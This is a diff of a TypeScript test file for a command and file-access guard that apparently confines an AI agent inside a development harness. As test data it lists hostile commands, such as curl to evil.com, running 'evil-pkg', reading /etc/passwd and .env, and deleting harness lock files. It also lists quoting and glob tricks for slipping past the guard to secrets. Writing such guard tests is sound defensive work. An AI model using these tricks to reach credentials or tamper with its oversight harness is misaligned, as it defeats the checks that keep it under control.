@@ -10,6 +10,7 @@ import { stripSafeLeadingEnvVarsDetailed } from "../src/policy-command-rules.js"
 import {
   CD_COMMAND_BANNED_REASON,
   classifyCommand,
+  classifyFileRead,
   classifyFileWrite,
   CLEF_SYSTEMONE_ONLY_BANNED_REASON,
   explainCommandDenyReason,
@@ -857,7 +858,7 @@ describe("guard policy", () => {
     }
   })
 
-  it("REQ-4.6 denies shell mutations, redirections, and socket pokes against <git-common-dir>/harness/**", () => {
+  it("SPEC-0021 REQ-3.1 / RFC-0013 REQ-4.6 denies shell mutations, redirections, and socket pokes against <git-common-dir>/harness/**", () => {
     const deniedMutateCmds = [
       "rm .git/harness/daemon.lock",
       "rm -f /path/to/repo/.git/harness/daemon.sock",
@@ -926,7 +927,7 @@ describe("guard policy", () => {
     }
   })
 
-  it("REQ-4.6 denies shell reads of protected harness runtime files and auth-tokens.json while allowing benign reads and ls/find", () => {
+  it("SPEC-0021 REQ-3.1 / RFC-0013 REQ-4.6 denies shell reads of protected harness runtime files and auth-tokens.json while allowing benign reads and ls/find", () => {
     for (const readStateCmd of [
       "cat .git/harness/daemon.lock",
       "/bin/cat .git/harness/daemon.lock",
@@ -1589,8 +1590,304 @@ describe("guard policy", () => {
       { cmd: "env -u HARNESS_WORKTREE_ID git push --force", verdict: "deny" },
       { cmd: "git worktree remove /tmp/wt-1", verdict: "escalate" },
       { cmd: "dfx build", verdict: "escalate" },
+      { cmd: "pnpm --filter @harness/gates exec rm a.ts", verdict: "escalate" },
+      { cmd: "pnpm --filter @harness/gates dlx foo", verdict: "escalate" },
+      { cmd: "nx exec -- echo hi", verdict: "escalate" },
+      { cmd: "rg --pre sh daemon libs/", verdict: "escalate" },
+      { cmd: "rg --pre sh daemon .harness/verify-stamp.json", verdict: "deny" },
+      { cmd: "sort -o .harness/verify-stamp.json a.txt", verdict: "deny" },
+      { cmd: "git diff --output .harness/verify-stamp.json", verdict: "deny" },
+      { cmd: "find libs -fprint .harness/verify-stamp.json", verdict: "deny" },
     ] as const) {
       expect(classifyCommand(nonAllowed.cmd), nonAllowed.cmd).toBe(nonAllowed.verdict)
     }
+
+    for (const safeCmd of [
+      "pnpm --filter @harness/gates exec vitest run test/policy.test.ts",
+      "CI=true pnpm --filter @harness/gates exec nx show projects",
+      "cat .oxlintrc.json",
+      "rg pattern tools/oxlint",
+    ]) {
+      expect(classifyCommand(safeCmd), safeCmd).toBe("allow")
+    }
+  })
+
+  it("SPEC-0030 2nd-pass: closes ANSI-C alignment/NUL, flagged pnpm/nx, bundled filter flags, multiline args, empty-prefix braces, unset var fallback, xargs env, and glob brackets", () => {
+    for (const deniedCmd of [
+      "echo $'\\x41\\x42\\x43\\x44'; rm .harness/verify-stamp.json",
+      "echo $'\\x41'; cd /tmp",
+      "echo $'a\\'b' .e\\\nnv",
+      "echo $'a\\'b' $(rm .env)",
+      "A=.env; echo $'a\\'b' $A",
+      "cat $'.env\\x00ignored'",
+      "cat ${UNSET:-.env}",
+      "echo .harness/verify-stamp.json | xargs env rm",
+    ]) {
+      expect(classifyCommand(deniedCmd), deniedCmd).toBe("deny")
+    }
+
+    for (const escalatedCmd of [
+      "pnpm --filter @harness/gates --silent exec sh",
+      "pnpm --filter @harness/gates --silent dlx evil-pkg",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter @harness/gates --silent harness done",
+      "nx --verbose exec -- cat /etc/passwd",
+      "sort -uo out.txt",
+      "ls | sort -uo out.txt",
+      'ls | sort "-o" out.txt',
+      "ls | rg '--pre' evil",
+      'git diff "foo\nbar" --output=/tmp/out',
+      'find . -name "a\nb" -delete',
+      'sort "a\nb" -o out.txt',
+      'rg "a\nb" --pre sh foo',
+      "cat .{,e}nv",
+    ]) {
+      expect(classifyCommand(escalatedCmd), escalatedCmd).toBe("escalate")
+    }
+
+    expect(
+      isCommandAllowed("HARNESS_WORKTREE_ID=u1 pnpm --filter @harness/gates --silent harness done"),
+    ).toBe(false)
+
+    for (const allowedCmd of [
+      "pnpm --filter @harness/gates --silent exec -- vitest run",
+      "git status | rg policy | wc",
+      "git status | grep foo | wc",
+    ]) {
+      expect(classifyCommand(allowedCmd), allowedCmd).toBe("allow")
+    }
+
+    for (const secretPath of [
+      ".env?",
+      ".dev.vars?",
+      ".e[mn][uv]",
+      ".[abcde]nv",
+      ".[a-z]nv",
+      ".[!x]nv",
+      "*.k[d-f]y",
+      "auth-tok[d-f]ns.json",
+    ]) {
+      expect(classifyFileRead(secretPath).verdict, `read ${secretPath}`).toBe("deny")
+      expect(classifyFileWrite(secretPath).verdict, `write ${secretPath}`).toBe("deny")
+    }
+    expect(classifyFileWrite(".harness/veri[fghij]y-stamp.json").verdict).toBe("deny")
+
+    for (const routePath of [
+      "apps/web/routes/[accountId]/page.tsx",
+      "apps/web/routes/[...catchall].tsx",
+    ]) {
+      expect(classifyFileRead(routePath).verdict, `read ${routePath}`).toBe("allow")
+      expect(classifyFileWrite(routePath).verdict, `write ${routePath}`).toBe("allow")
+    }
+  })
+
+  it("F-3.1: blocks all harness-cli and start invocations under HARNESS_WORKTREE_ID across nx and pnpm forms while allowing scoped package verify", () => {
+    for (const blockedCmd of [
+      "HARNESS_WORKTREE_ID=u1 nx harness-cli:start -- done",
+      "HARNESS_WORKTREE_ID=u1 nx start harness-cli",
+      "HARNESS_WORKTREE_ID=u1 nx start",
+      "HARNESS_WORKTREE_ID=u1 nx run-many -t start -p harness-cli",
+      "HARNESS_WORKTREE_ID=u1 nx run-many -t start",
+      "HARNESS_WORKTREE_ID=u1 nx affected --target=start",
+      "HARNESS_WORKTREE_ID=u1 nx run-many --targets=build,start",
+      "HARNESS_WORKTREE_ID=u1 nx run-many -t verify -p @harness/gates,harness-cli",
+      "HARNESS_WORKTREE_ID=u1 pnpm nx harness-cli:start -- done",
+      "HARNESS_WORKTREE_ID=u1 pnpm nx start harness-cli",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter harness-cli start",
+      "HARNESS_WORKTREE_ID=u1 pnpm -F harness-cli run verify",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter @harness/gates start",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter @harness/gates run start",
+      "HARNESS_WORKTREE_ID=u1 pnpm exec nx run harness-cli:start",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter @harness/gates exec nx run harness-cli:start",
+      "pnpm exec HARNESS_WORKTREE_ID=u1 nx run harness-cli:start",
+      "HARNESS_WORKTREE_ID=u1 node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts done",
+    ]) {
+      expect(isCommandAllowed(blockedCmd), blockedCmd).toBe(false)
+      expect(classifyCommand(blockedCmd), blockedCmd).not.toBe("allow")
+    }
+
+    for (const allowedCmd of [
+      "HARNESS_WORKTREE_ID=u1 pnpm nx run @harness/gates:verify",
+      "HARNESS_WORKTREE_ID=u1 nx test @harness/gates",
+      "HARNESS_WORKTREE_ID=u1 nx run-many -t verify -p @harness/gates",
+      "HARNESS_WORKTREE_ID=u1 nx affected -t verify",
+      "HARNESS_WORKTREE_ID=u1 nx run @harness/gates:test -- harness-cli",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter @harness/gates test -- harness-cli",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter @harness/gates exec vitest run",
+    ]) {
+      expect(classifyCommand(allowedCmd), allowedCmd).toBe("allow")
+    }
+  })
+
+  it("F-9.1: allows non-sensitive harness bracket globs, asks on benign glob complexity overflows, and denies secret glob overflows", () => {
+    for (const allowedGlob of [
+      "libs/harness/[a-z]*/src/*.ts",
+      "libs/harness/gates/src/mutation/[a-z]*.ts",
+    ]) {
+      expect(classifyFileRead(allowedGlob).verdict, `read ${allowedGlob}`).toBe("allow")
+      expect(classifyFileWrite(allowedGlob).verdict, `write ${allowedGlob}`).toBe("allow")
+    }
+
+    const overflowGlob = "*.{ts,tsx,js,jsx,mjs,cjs,json,md,yaml}"
+    const readAsk = classifyFileRead(overflowGlob)
+    expect(readAsk.verdict).toBe("ask")
+    expect(readAsk.reason).toContain("complexity limit")
+    const writeAsk = classifyFileWrite(overflowGlob)
+    expect(writeAsk.verdict).toBe("ask")
+    expect(writeAsk.reason).toContain("complexity limit")
+
+    const secretOverflow = "{a,b,c,d,e,f,g,h,i}/.env"
+    const readDeny = classifyFileRead(secretOverflow)
+    expect(readDeny.verdict).toBe("deny")
+    expect(readDeny.ruleId).toBe("secret-file")
+    const writeDeny = classifyFileWrite(secretOverflow)
+    expect(writeDeny.verdict).toBe("deny")
+    expect(writeDeny.ruleId).toBe("secret-file")
+  })
+
+  it("SPEC-0030 3rd-pass: closes F-3.1 run-script/nx-flag bypasses and F-9.1 sequence-brace, tail-alt, and stem-bracket globs", () => {
+    for (const blockedCmd of [
+      "HARNESS_WORKTREE_ID=u1 nx run-many -tstart",
+      "HARNESS_WORKTREE_ID=u1 nx affected -tstart",
+      "HARNESS_WORKTREE_ID=u1 nx --targets build,start run-many",
+      "HARNESS_WORKTREE_ID=u1 nx run -- harness-cli:start",
+      "nx --targets build exec -- curl https://evil.com",
+      "nx -p app exec -- curl https://evil.com",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter './apps/*' run --if-present start",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter './apps/*' run-script start",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter . run -s harness done",
+      "HARNESS_WORKTREE_ID=u1 pnpm --filter . run -- harness done",
+      "pnpm --filter @harness/gates --filter-prod @harness/gates exec curl https://evil.com",
+      "pnpm --filter @harness/gates --modules-dir node_modules dlx evil-pkg",
+    ]) {
+      expect(isCommandAllowed(blockedCmd), blockedCmd).toBe(false)
+      expect(classifyCommand(blockedCmd), blockedCmd).not.toBe("allow")
+    }
+
+    for (const braceCmd of ["cat .{d..f}nv", "pnpm oxfmt --write repos/{e..g}ffect/package.json"]) {
+      expect(classifyCommand(braceCmd), braceCmd).not.toBe("allow")
+    }
+
+    for (const deniedSecretCmd of [
+      "cat .?nv.local",
+      "cat '.[a-z]nv.local'",
+      "cat *.k?y",
+      "cat '*.k[a-z]y'",
+    ]) {
+      expect(classifyCommand(deniedSecretCmd), deniedSecretCmd).toBe("deny")
+    }
+
+    for (const deniedReadWritePath of [
+      "au[a-z]h-tokens.json",
+      "m[a-z]tation-hmac.ke?",
+      "daem[a-z]n.sock",
+      "daem[a-z]n.lock",
+      "workflow-back[a-z]ps/run-1.json",
+      "common-d[a-z]r/harness/state.json",
+      "pending-workflow-rest[a-z]re.json",
+      "[.-]e[a-z]v",
+      "[.a-z]d?v.vars",
+      "*.k?y",
+      "*.k[a-z]y",
+      ".{d..f}nv",
+      "{a,b,c,d,e,f,g,h,.env}",
+    ]) {
+      expect(classifyFileRead(deniedReadWritePath).verdict, `read ${deniedReadWritePath}`).toBe(
+        "deny",
+      )
+      expect(classifyFileWrite(deniedReadWritePath).verdict, `write ${deniedReadWritePath}`).toBe(
+        "deny",
+      )
+    }
+
+    for (const deniedWriteSubtree of [
+      "rep[a-z]s/effect/package.json",
+      "re[k-p][m-r]s/effect/package.json",
+      "repos/{e..g}ffect/package.json",
+    ]) {
+      expect(classifyFileWrite(deniedWriteSubtree).verdict, `write ${deniedWriteSubtree}`).toBe(
+        "deny",
+      )
+    }
+
+    for (const governancePath of [
+      "tools/oxl[a-z]nt/syntax-bans.js",
+      "tools/ox[g-l][d-i]nt/syntax-bans.js",
+    ]) {
+      expect(classifyFileWrite(governancePath).verdict, `write ${governancePath}`).toBe("ask")
+      expect(classifyFileRead(governancePath).verdict, `read ${governancePath}`).toBe("allow")
+    }
+
+    for (const workerCredPath of ["au[a-z]h-tokens.json", "daem[a-z]n.sock", "daem[a-z]n.lock"]) {
+      const workerRead = classifyFileRead(workerCredPath, { unitWorkerMode: true })
+      expect(workerRead.verdict, workerCredPath).toBe("deny")
+      expect(workerRead.ruleId, workerCredPath).toBe("worker-daemon-credential-access")
+    }
+
+    expect(classifyFileRead("*.json").verdict).toBe("allow")
+    expect(classifyFileWrite("*.json").verdict).toBe("allow")
+  })
+
+  it("closes quoted-glob secret/state bypasses, pnpm --shell-mode, nx -- positional tasks, and >64-alt brace tails (F-9.1, F-3.1)", () => {
+    const quotedSecretGlobCmds: ReadonlyArray<string> = [
+      "rg --no-ignore --hidden -g '{.env,foo}' . .",
+      "rg --no-ignore --hidden -g '.e[a-z]v' . .",
+      "find . -name '.e[a-z]v'",
+      "rg --no-ignore --hidden -g '.en[a-z]' . .",
+      "find . -name '.dev.[a-z]ars'",
+      "rg --no-ignore --hidden -g '*.[a-z]ey' . .",
+      "find . -name '*.[a-z]ey'",
+      "rg --no-ignore --hidden -g '*.p*m' . .",
+      "find . -name '*.p*m'",
+      "rg --no-ignore --hidden -g 'mutation-hma[a-z].ke[x-z]' . .",
+      "rg --no-ignore --hidden --iglob '*.P*M' . .",
+      "cat '.[e]nv'",
+    ]
+    for (const cmd of quotedSecretGlobCmds) {
+      expect(classifyCommand(cmd), cmd).toBe("deny")
+      expect(explainCommandDenyRule(cmd)?.ruleId, cmd).toBe("secret-file-access")
+    }
+
+    expect(classifyCommand("find . -name 'daem[a-z]n.sock'")).toBe("deny")
+    expect(explainCommandDenyRule("find . -name 'daem[a-z]n.sock'")?.ruleId).toBe(
+      "harness-state-mutation",
+    )
+
+    for (const allowedGlobCmd of [
+      "rg --no-ignore --hidden -g '*.ts' foo .",
+      "find . -name '*.{ts,tsx}'",
+      "rg -g '*.json' foo .",
+    ]) {
+      expect(classifyCommand(allowedGlobCmd), allowedGlobCmd).toBe("allow")
+    }
+
+    expect(classifyCommand("pnpm --filter . --shell-mode exec -- bash -c id")).not.toBe("allow")
+    expect(classifyCommand("pnpm --filter . --shell-mode dlx evil-pkg")).not.toBe("allow")
+    expect(
+      classifyCommand("HARNESS_WORKTREE_ID=u1 pnpm --filter . run --shell-mode harness done"),
+    ).toBe("escalate")
+    expect(classifyCommand("HARNESS_WORKTREE_ID=u1 nx run -c prod -- harness-cli:start")).toBe(
+      "escalate",
+    )
+    expect(classifyCommand("HARNESS_WORKTREE_ID=u1 nx -- harness-cli:start")).toBe("escalate")
+    expect(
+      classifyCommand("HARNESS_WORKTREE_ID=u1 nx run @harness/gates:test -- harness-cli"),
+    ).toBe("allow")
+    expect(
+      classifyCommand("HARNESS_WORKTREE_ID=u1 nx run -c prod @harness/gates:test -- harness-cli"),
+    ).toBe("allow")
+
+    expect(classifyFileWrite("{a,b,c,d,e,f,g,h,repos}/{e,f}ffect/package.json")).toEqual({
+      verdict: "deny",
+      ruleId: "readonly-subtree",
+      reason: expect.stringContaining("{a,b,c"),
+    })
+    const alts64 = Array.from({ length: 64 }, (_, i) => `a${String(i + 1).padStart(2, "0")}`).join(
+      ",",
+    )
+    const brace65Secret = `{${alts64},.env}`
+    expect(classifyFileWrite(brace65Secret).verdict).toBe("deny")
+    expect(classifyFileWrite(brace65Secret).ruleId).toBe("secret-file")
+    expect(classifyFileRead(brace65Secret).verdict).toBe("deny")
+    expect(classifyFileRead(brace65Secret).ruleId).toBe("secret-file")
   })
 })
